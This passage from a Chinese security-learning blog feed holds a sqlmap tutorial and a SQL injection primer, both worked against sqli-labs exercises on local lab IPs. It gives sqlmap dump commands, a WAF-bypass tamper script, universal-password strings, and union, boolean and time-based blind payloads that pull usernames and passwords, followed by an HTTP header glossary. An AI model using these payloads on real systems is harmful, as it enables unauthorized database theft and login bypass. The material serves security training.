class="line"></span><br><span class="line">  目标：</span><br><span class="line">    至少提供以下选项之一以定义目标</span><br><span class="line"></span><br><span class="line">    -u URL, --url=URL   目标URL（例如“http:<span class="comment">//www.site.com/vuln.php?id=1”）</span></span><br><span class="line">    -g GOOGLEDORK       将谷歌 dork 结果处理为目标URL</span><br><span class="line"></span><br><span class="line">  请求：</span><br><span class="line">    这些选项可用于指定如何连接到目标URL</span><br><span class="line"></span><br><span class="line">    --data=DATA         要通过POST发送的数据字符串（例如“id=<span class="number">1</span>”）</span><br><span class="line">    --cookie=COOKIE     HTTP Cookie 头值（例如“PHPSESSID=a8d127e..”）</span><br><span class="line">    --random-agent      使用随机选择的HTTP User-Agent 头值</span><br><span class="line">    --proxy=PROXY       使用代理连接到目标URL</span><br><span class="line">    --tor               使用 Tor 匿名网络</span><br><span class="line">    --check-tor         检查Tor是否正确使用</span><br><span class="line"></span><br><span class="line">  注入：</span><br><span class="line">    这些选项可用于指定要测试的参数，提供自定义注入载荷和可选的篡改脚本</span><br><span class="line"></span><br><span class="line">    -p TESTPARAMETER    可测试的参数</span><br><span class="line">    --dbms=DBMS         强制指定后端DBMS的值</span><br><span class="line"></span><br><span class="line">  检测：</span><br><span class="line">    这些选项可用于自定义检测阶段</span><br><span class="line"></span><br><span class="line">    --level=LEVEL       要执行的测试级别（<span class="number">1</span>-<span class="number">5</span>，默认为<span class="number">1</span>）</span><br><span class="line">    --risk=RISK         要执行的测试风险（<span class="number">1</span>-<span class="number">3</span>，默认为<span class="number">1</span>）</span><br><span class="line"></span><br><span class="line">  技术：</span><br><span class="line">    这些选项可用于调整特定SQL注入技术的测试</span><br><span class="line"></span><br><span class="line">    --technique=TECH..  要使用的SQL注入技术（默认为“BEUSTQ”）</span><br><span class="line"></span><br><span class="line">  枚举：</span><br><span class="line">    这些选项可用于枚举后端数据库管理系统中的信息、结构和数据</span><br><span class="line"></span><br><span class="line">    -a, --all           检索所有内容</span><br><span class="line">    -b, --banner        检索DBMS横幅</span><br><span class="line">    --current-user      检索DBMS当前用户</span><br><span class="line">    --current-db        检索DBMS当前数据库</span><br><span class="line">    --passwords         枚举DBMS用户的密码哈希</span><br><span class="line">    --dbs               枚举DBMS数据库</span><br><span class="line">    --tables            枚举DBMS数据库表</span><br><span class="line">    --columns           枚举DBMS数据库表列</span><br><span class="line">    --schema            枚举DBMS架构</span><br><span class="line">    --dump              转储DBMS数据库表条目</span><br><span class="line">    --dump-all          转储所有DBMS数据库表条目</span><br><span class="line">    -D DB               要枚举的DBMS数据库</span><br><span class="line">    -T TBL              要枚举的DBMS数据库表</span><br><span class="line">    -C COL              要枚举的DBMS数据库表列</span><br><span class="line"></span><br><span class="line">  操作系统访问：</span><br><span class="line">    这些选项可用于访问后端数据库管理系统的底层操作系统</span><br><span class="line"></span><br><span class="line">    --os-shell          提示进行交互式操作系统shell</span><br><span class="line">    --os-pwn            提示进行OOB shell、Meterpreter或VN</span><br><span class="line"></span><br><span class="line">  通用：</span><br><span class="line">    这些选项可用于设置一些通用工作参数</span><br><span class="line"></span><br><span class="line">    --batch             不要请求用户输入，使用默认行为</span><br><span class="line">    --flush-session     刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">  其他：</span><br><span class="line">    这些选项不适用于其他任何类别</span><br><span class="line"></span><br><span class="line">    --wizard            面向初学者用户的简单向导界面</span><br><span class="line"></span><br><span class="line">[!] 要查看完整的选项列表，请使用“-hh”选项运行。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查security数据库中的表：python sqlmap.py  -u <span class="string">&quot;http://192.168.2.110/sqli/Less-1/?id=1&quot;</span>  --batch  -D security --tables</span><br><span class="line"></span><br><span class="line">查库：python sqlmap.py  -u <span class="string">&quot;http://192.168.2.110/sqli/Less-1/?id=1&quot;</span> --dbs --batch</span><br><span class="line"></span><br><span class="line">查字段：python sqlmap.py  -u <span class="string">&quot;http://192.168.2.110/sqli/Less-1/?id=1&quot;</span>  --batch  -D security -T users --columns</span><br><span class="line"></span><br><span class="line">查id,username：python sqlmap.py  -u <span class="string">&quot;http://192.168.2.110/sqli/Less-1/?id=1&quot;</span>  --batch  -D security -T users -C <span class="string">&quot;id,username&quot;</span> --dump</span><br><span class="line"></span><br><span class="line">查字段：python sqlmap.py  -u <span class="string">&quot;http://192.168.2.110/sqli/Less-1/?id=1&quot;</span>  --batch  -D security -T users  --dump</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>查库的结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703345892875-8ffcdb44-f607-4dbc-8312-6b9c53528fe9.png" alt="image.png"><br>查security库中的表的结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703345942040-0e060cb7-f04f-4b2f-a746-ba4b18df5565.png" alt="image.png"><br>查security库中users表的字段：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703346092485-e8e04216-b065-403e-bd52-15723cd32d28.png" alt="image.png"><br>查security库中users表的id，username的值：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703346340789-99ba47cc-6329-4258-aa09-c2bb6b6d4a4e.png" alt="image.png"><br>查security库中users表的值：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703346541654-95cf0586-b4c6-44df-a909-6b62e87f29ba.png" alt="image.png"><br>post请求：<br>以第11关为例：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703347187990-4fe88393-9217-424c-abd5-b8ca5c7f75b0.png" alt="image.png"><br>打开yakit免配置启动。<br>输入虚拟机的ip地址进入第11关。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703347331454-18708817-f96b-46b7-a1dc-8de87609a6bd.png" alt="image.png"><br>用yakit进行抓包发送到web fuzzer<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703347434256-fc9fa70d-f5c5-4769-9c49-bc780f5c420a.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这段文本是一个 HTTP POST 请求的示例。请求中包含了一些请求头和请求体的参数。解释如下：</span><br><span class="line"></span><br><span class="line">- `POST /sqli/Less-16/ HTTP/1.1`：表示请求使用 HTTP POST 方法发送到 `/sqli/Less-16/` 的路径。</span><br><span class="line">- `Host: 192.168.2.110`：指定目标主机的 IP 或域名。</span><br><span class="line">- `Accept-Encoding: gzip, deflate`：表明客户端可以接受的内容编码方式，例如 gzip 或 deflate。</span><br><span class="line">- `Cache-Control: max-age=0`：指示缓存控制方式为不缓存。</span><br><span class="line">- `Upgrade-Insecure-Requests: 1`：表示客户端请求升级到安全连接，并告知服务器支持此行为。</span><br><span class="line">- `Accept-Language: zh-CN,zh;q=0.9`：指定客户端可接受的自然语言。</span><br><span class="line">- `Origin: http://192.168.2.110`：指定请求的来源。</span><br><span class="line">- `Accept: ...`：一个长的 Accept 字段，表示客户端可接受的媒体类型。</span><br><span class="line">- `Referer: http://192.168.2.110/sqli/Less-16/`：指示请求的来源页面链接地址。</span><br><span class="line">- `User-Agent: ...`：客户端的用户代理标识，用于标识客户端的浏览器或应用程序。</span><br><span class="line">- `Content-Type: application/x-www-form-urlencoded`：指定请求体的内容类型为 URL 编码的表单数据。</span><br><span class="line">- `Content-Length: 41`：指示请求体的长度为 41 字节。</span><br><span class="line"></span><br><span class="line">最后，请求体中包含了表单数据，使用了 `uname`, `passwd` 和 `submit` 作为参数名称，并对参数值进行了 URL 编码。其中，`uname=admin%22%23` 表示 `uname` 参数的值是 `admin&quot;`，`passwd=ad` 表示 `passwd` 参数的值是 `ad`，`submit=Submit` 表示 `submit` 参数的值是 `Submit`。</span><br><span class="line"></span><br><span class="line">总之，这段文本表示一个 HTTP POST 请求，目标是发送表单数据到指定的路径，并附带一些请求头和请求体的参数。</span><br></pre></td></tr></table></figure><p>将1.txt保存下来存在sqlmap的上一级目录中<br>输入命令：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r <span class="string">&quot;../1.txt&quot;</span>  --dbs --batch</span><br><span class="line">增加等级与风险：  python sqlmap.py -r <span class="string">&quot;../1.txt&quot;</span>  --dbs --batch --level=<span class="number">5</span> --risk=<span class="number">3</span></span><br></pre></td></tr></table></figure><p>此时爆出数据库，后续的操作如上图所示一样，就不展示了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703348000344-f1b633df-d235-48ea-aa19-c5b37be8ef63.png" alt="image.png"></p><h2 id="五-Sqlmap的Tamper"><a href="#五-Sqlmap的Tamper" class="headerlink" title="五.Sqlmap的Tamper"></a>五.Sqlmap的Tamper</h2><h3 id="1-Tamper脚本的介绍："><a href="#1-Tamper脚本的介绍：" class="headerlink" title="1.Tamper脚本的介绍："></a>1.Tamper脚本的介绍：</h3><p>它允许用户在执行SQL注入攻击时对 payload（攻击载荷）进行修改，以绕过目标服务器的防护机制，如WAF（Web Application Firewall）或IDS（Intrusion Detection System）。这些防护系统通常会检测和过滤掉某些特定的关键字或模式，以防止恶意攻击。Tamper脚本对payload进行转换或编码，使其能够逃避这些检测。</p><h3 id="2-tamper脚本写法："><a href="#2-tamper脚本写法：" class="headerlink" title="2.tamper脚本写法："></a>2.tamper脚本写法：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;UnioN&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;SeLeCt&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;&amp;&amp;&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;||&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%0b&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h3 id="2-Sqlmap常用命令："><a href="#2-Sqlmap常用命令：" class="headerlink" title="2.Sqlmap常用命令："></a>2.Sqlmap常用命令：</h3><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703774560959-2550790a-2d02-4e02-b7da-de1dbb8ee384.png"></p><h3 id="3-Sqlmap跑sqli-labs-26a关"><a href="#3-Sqlmap跑sqli-labs-26a关" class="headerlink" title="3.Sqlmap跑sqli-labs 26a关"></a>3.Sqlmap跑sqli-labs 26a关</h3><p>在vscode中新建1.py 并在它中编写26a关的Tamper脚本，将其复制到kali机的&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F; 的目录下。在kali的命令窗口运行以下命令;<br>sqlmap -u “<a href="http://192.168.2.2/sqli/Less-26a/?id=1">http://192.168.2.2/sqli/Less-26a/?id=1</a>“ -p id –dbms&#x3D;MySQL –tamper&#x3D;”1.py” –dbs –batch<br>成功爆出数据库<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703775172152-497ec8a3-68f9-4164-b79c-473774736168.png"></p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2024/01/01/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/01/01/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="一、概念："><a href="#一、概念：" class="headerlink" title="一、概念："></a>一、概念：</h2><p>SQL注入是一种常见的攻击技术，它利用应用程序对用户输入数据的不当处理，通过在应用程序的输入框中注入恶意的SQL代码，从而使攻击者能够执行未经授权的数据库查询。攻击者可以利用SQL注入来访问敏感的数据，修改数据库内容，甚至获取系统权限。<br>SQL注入通常发生在需要用户输入数据的网页表单、搜索框、登录框等地方。攻击者可以利用这些输入框，输入特定的恶意SQL代码。<br>条件：用户可以控制数据的输入，<br>原本要运行的代码拼接了用户的输入并运行。<br>危害：</p><ol><li>盗取网站的敏感信息</li><li>绕过网站后台认证 后台登录语句： SELECT * FROM admin WHERE Username&#x3D;‘user’ and Password&#x3D;‘pass’ 万能密码：‘or ’1‘ &#x3D; ’1‘ #;<br>3.借助SQL注入漏洞提权获取系统权限;<br>4.读取文件信息。</li></ol><h2 id="二-联合注入"><a href="#二-联合注入" class="headerlink" title="二.联合注入"></a>二.联合注入</h2><p>原理：<br>       MYSQL数据库的包容性比较强，如果你输错了数据的类型，MYSQL数据库会自动将其转换成正确的数据类型，比如输入1)、1”、1-等，只要数字后面的字符不是闭合符的，数据库都会把你输入的错误的数据转换成正确的数据类型。<br>      但是，若输入的数字后面的字符恰好是闭合符，则会形成闭合，若闭合后形成的sql语句是错误的，那么sql语句执行就会错误，从而造成页面显示错误。<br>注释符：<br>在SQL中，常用的注释符号包括两种类型：单行注释和多行注释。</p><ol><li>单行注释：常用的单行注释符号是双斜杠（&#x2F;&#x2F;）或井号（#），不同的数据库系统可能支持不同的单行注释符号。在大多数数据库中，两个斜杠（&#x2F;&#x2F;）或井号（#）后的内容将被视为注释，直到行尾为止。<br>例如，在MySQL中，可以使用如下的单行注释符号：<br>SELECT * FROM table_name WHERE column_name &#x3D; ‘value’;  &#x2F;&#x2F; 这是单行注释<br>在Oracle数据库中，可以使用如下的单行注释符号：<br>SELECT * FROM table_name WHERE column_name &#x3D; ‘value’;  # 这也是单行注释</li><li>多行注释：多行注释通常以”&#x2F;<em>“开始，以 “</em>&#x2F;“ 结束，之间的内容都被视为注释。<br>&#x2F;* 这是 一个多行注释 *&#x2F;<br>SELECT * FROM table_name;<br>在编写SQL语句时，注释符号是非常有用的，可以帮助开发人员在代码中添加注释说明，也可以用于临时屏蔽某些SQL语句以便调试和测试。</li></ol><p>其他不要多说直接记住这三句代码：<br>第一个查所有的表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) ,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><p>select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database();<br>第二个查某个表的所有字段名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) ,<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><p>select 1,group_concat(column_name) ,3 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database();<br>第三个查某个表内某个字段名的对应的值</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,group_concat(id,&quot; &quot;,username,&quot; &quot;,password),<span class="number">3</span>  <span class="keyword">from</span> users ;</span><br></pre></td></tr></table></figure><p> select 1,group_concat(id,” “,username,” “,password),3  from users ;</p><h3 id="1-案例："><a href="#1-案例：" class="headerlink" title="1.案例："></a>1.案例：</h3><p>这里以sql注入的第一关为例：<br>第一关：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703076696287-849a12e1-e30c-4899-8f0d-9e2bd027a926.png" alt="image.png"><br>第一关整体是这样的，整体的思路是先去用id&#x3D;1进行判断<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703077253462-7ca9c245-4117-4e3c-bd5a-c2401b78207a.png" alt="image.png"><br>结果是能够正常显示</p><p>再用id&#x3D;1’时出现报错，发现没有产生闭合，最关键的原因再与id&#x3D;’’这里有个单引号导致无法闭合。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703077985517-0e9465c7-2425-41f9-b94d-012256a58818.png" alt="image.png"><br>由于1能够显示这里选0,接着用union联合对当前数据库下的表进行查看<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703079464013-9f30a372-7137-48d3-9662-1af165cf50e0.png" alt="image.png"><br>从表中可以查到users表，于是可以对users表中的字段进行查找<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703081184908-525a9f86-dd8d-4cf8-90f7-d5b36ec4a60d.png" alt="image.png"><br>最后就是查找字段中的具体数据。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703081593182-4f027604-aef9-441d-8b23-a40109438c7a.png" alt="image.png"><br>此时能够进行正常的得出结果。</p><h3 id="2-基本方法："><a href="#2-基本方法：" class="headerlink" title="2.基本方法："></a>2.基本方法：</h3><p>总结出方法：<br>1.首先我们可以使用(转义字符)来判断SQL注入的闭合方式。<br>原理，当闭合字符遇到转义字符时，会被转义，那么没有闭合符的语句就不完整了，就会报错，通过报错信息我们就可以推断出闭合符。<br>分析报错信息：看\斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。<br>方法2：<br>首先尝试：<br>?id&#x3D;1’<br>?id&#x3D;1”<br>结果一：如果都报错<br>判断闭合符为：整形闭合。<br>结果二：如果单引号报错，双引号不报错。<br>继续尝试<br>?id&#x3D;1’ –-+<br>结果1：无报错<br>判断闭合符为：单引号闭合。<br>结果2：报错<br>判断闭合符可能为：单引号加括号。<br>结果三：如果单引号不报错，双引号报错。<br>继续尝试<br>?id&#x3D;1” -–+<br>结果1：结果无报错<br>判断闭合符为：双引号闭合。<br>结果2：报错<br>判断闭合符可能为：双引号加括号。</p><p>post请求：<br>有输入框的<br>万能语句：<br>1 or 1&#x3D;1 – #             1) or 1&#x3D;1– #            1)) or 1&#x3D;1– #<br>1’ or 1&#x3D;1 – #            1’) or 1&#x3D;1– #           1’) or 1&#x3D;1– #<br>1” or 1&#x3D;1 – #           1”) or 1&#x3D;1– #          1”) or 1&#x3D;1– #<br>一般POST型使用1’ or 1&#x3D;1 – #和1” or 1&#x3D;1 – # 成功的概率最大因单双引号引起的闭合问题更大点<br>猜数据库第一位：（利用二分法）：(特别提醒这里的逻辑运算符要用 or)<br>uname&#x3D;1’ or left(database(),1)&gt;’a’– #&amp;passwd&#x3D;1          返回正确<br>uname&#x3D;1’ or left(database(),1)&gt;’s’– #&amp;passwd&#x3D;1          返回错误<br>uname&#x3D;1’ or left(database(),1)&#x3D;’s’– #&amp;passwd&#x3D;1          返回正确<br>常见判断语句：<br>‘ or if(1,1,sleep(5))– #<br>“ or if(1,1, sleep(5))– #<br>) or if(1,1, sleep(5))– #<br>‘) or if(1,1, sleep(5))– #<br>“) or if(1,1, sleep(5))– #<br>（PS：如果不能闭合，select语句会直接报错）<br>猜数据库长度：<br>(再次强调&amp;passwd&#x3D;1不能少，因为后台源码中设置uname和passwd这两个参数任何一个都不能为空，一旦其中一个为空将不会执行SQL语句）<br>uname&#x3D;1’orif(length(database())&#x3D;x,1,sleep(5))#&amp;passwd&#x3D;1，x从4开始增加，增加到8有明显的延迟，说明数据库的长度是8；<br>uname&#x3D;1&amp;passwd&#x3D;1’or if(length(database())&#x3D;8,1,sleep(5))— #</p><h4 id="1-猜数据库名-可以用-比较，对字符进行范围的判断，然后用二分法不断缩小范围"><a href="#1-猜数据库名-可以用-比较，对字符进行范围的判断，然后用二分法不断缩小范围" class="headerlink" title="1.猜数据库名(可以用 &lt;  &gt;  &#x3D; 比较，对字符进行范围的判断，然后用二分法不断缩小范围)"></a>1.猜数据库名(可以用 &lt;  &gt;  &#x3D; 比较，对字符进行范围的判断，然后用二分法不断缩小范围)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span><span class="string">&#x27; or If(ascii(substr(database(),1,1))=115,1,sleep(5))-- #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname=1&amp;passwd=1&#x27;</span> <span class="keyword">or</span> <span class="title function_ invoke__">If</span>(<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">5</span>))-- <span class="comment">#</span></span><br></pre></td></tr></table></figure><h4 id="2-猜数据库中的表"><a href="#2-猜数据库中的表" class="headerlink" title="2.猜数据库中的表"></a>2.猜数据库中的表</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span><span class="string">&#x27; or If(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))=101,1,sleep(5))-- #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname=1&amp;passwd=1&#x27;</span> <span class="keyword">or</span> <span class="title function_ invoke__">If</span>(<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">109</span>,<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">5</span>))-- <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">猜测第一个数据表的第一位是 e,...依次类推，得到 emails</span><br><span class="line"></span><br><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span><span class="string">&#x27; or If(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 1,1),1,1))=114,1,sleep(5))-- #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname=1&amp;passwd=1&#x27;</span> <span class="keyword">or</span> <span class="title function_ invoke__">If</span>(<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">5</span>))-- <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line">猜测第二个数据表的第一位是 r,...依次类推，得到 referers</span><br></pre></td></tr></table></figure><h4 id="3-猜users表里的列（ASCII码-i-105）"><a href="#3-猜users表里的列（ASCII码-i-105）" class="headerlink" title="3.猜users表里的列（ASCII码 i-105）"></a>3.猜users表里的列（ASCII码 i-105）</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span><span class="string">&#x27; or If(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=database() limit 0,1),1,1))=105,1,sleep(5))-- #</span></span><br><span class="line"><span class="string">猜测 users 表的第一个列的第一个字符是 i，</span></span><br><span class="line"><span class="string">以此类推，我们得到列名是 id，username，password</span></span><br><span class="line"><span class="string">（and table_schema=database()这条语句不能少是因为要排除其他数据库可能也会有users表）</span></span><br></pre></td></tr></table></figure><h4 id="4-猜users表里的username的值（ASCII码-D-68）"><a href="#4-猜users表里的username的值（ASCII码-D-68）" class="headerlink" title="4.猜users表里的username的值（ASCII码 D&#x3D;68）"></a>4.猜users表里的username的值（ASCII码 D&#x3D;68）</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span><span class="string">&#x27; or If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))-- #</span></span><br><span class="line"><span class="string">猜测 username 的第一行的第一位</span></span><br><span class="line"><span class="string">以此类推，我们得到数据库 username，password 的所有内容：（13个账户与密码）</span></span><br></pre></td></tr></table></figure><p>GET和POST差别在于，GET只需要提交参数id，而POST则需要username与password都正确。</p><h4 id="5-分析查询语句"><a href="#5-分析查询语句" class="headerlink" title="5.分析查询语句"></a>5.分析查询语句</h4><p>不像GET中若出现错误回显必是Mysql语法错误（提交时使id存在），POST若不返回Mysql错误信息，光凭一个登录失败是分不清是用户名和密码不正确还是出现了Mysql语法错误。<br>所以我们就需要在POST时构造永真条件使返回忽略用户名和密码不正确这种情况。若将查询语句闭合则会显示登陆成功，则可以依次增加小括号个数分析查询语句：<br>永真语句：<br>uname&#x3D;1&amp;passwd&#x3D;1 or 1&#x3D;1–+<br>uname&#x3D;1&amp;passwd&#x3D;1’ or 1&#x3D;1–+<br>uname&#x3D;1&amp;passwd&#x3D;1” or 1&#x3D;1–+<br>uname&#x3D;1&amp;passwd&#x3D;1’) or 1&#x3D;1–+<br>uname&#x3D;1&amp;passwd&#x3D;1”) or 1&#x3D;1–+</p><h4 id="6-http头部介绍："><a href="#6-http头部介绍：" class="headerlink" title="6.http头部介绍："></a>6.http头部介绍：</h4><p>在利用抓包工具进行抓包的时候，我们能看到很多的项，下面详细讲解每一项。<br>HTTP头部详解<br>1、 Accept：告诉WEB服务器自己接受什么介质类型，*&#x2F;* 表示任何类型，type&#x2F;* 表示该类型下的所有子类型，type&#x2F;sub-type。<br>2、 Accept-Charset： 浏览器申明自己接收的字符集<br> Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）<br> Accept-Language：：浏览器申明自己接收的语言<br>语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。<br>3、 Accept-Ranges：WEB服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。<br>4、 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。<br>5、 Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB服务器。<br>6、 Cache-Control：请求：no-cache（不要缓存的实体，要求现在从WEB服务器去取）<br>max-age：（只接受 Age 值小于 max-age 值，并且没有过期的对象）<br>max-stale：（可以接受过去的对象，但是过期时间必须小于 max-stale 值）<br>min-fresh：（接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象）<br>响应：public(可以用 Cached 内容回应任何用户)<br>private（只能用缓存内容回应先前请求该内容的那个用户）<br>no-cache（可以缓存，但是只有在跟WEB服务器验证了其有效后，才能返回给客户端）<br>max-age：（本响应包含的对象的过期时间）<br>ALL: no-store（不允许缓存）<br>7、 Connection：请求：close（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。<br>keepalive（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。<br>响应：close（连接已经关闭）。<br>keepalive（连接保持着，在等待本次连接的后续请求）。<br>Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300<br>8、 Content-Encoding：WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip<br>9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。<br>10、Content-Length： WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length: 26012<br>11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021&#x2F;47022<br>12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application&#x2F;xml<br>13、 ETag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会别修改，所以ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。<br>14、 Expired：WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP&#x2F;1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT<br>15、 Host：客户端指定自己想访问的WEB服务器的域名&#x2F;IP 地址和端口号。例如：Host：rss.sina.com.cn<br>16、 If-Match：如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。<br>17、If-None-Match：如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。<br>18、 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器 该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT<br>19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。<br>20、 If-Range：浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一起使用。<br>21、 Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT<br>22、 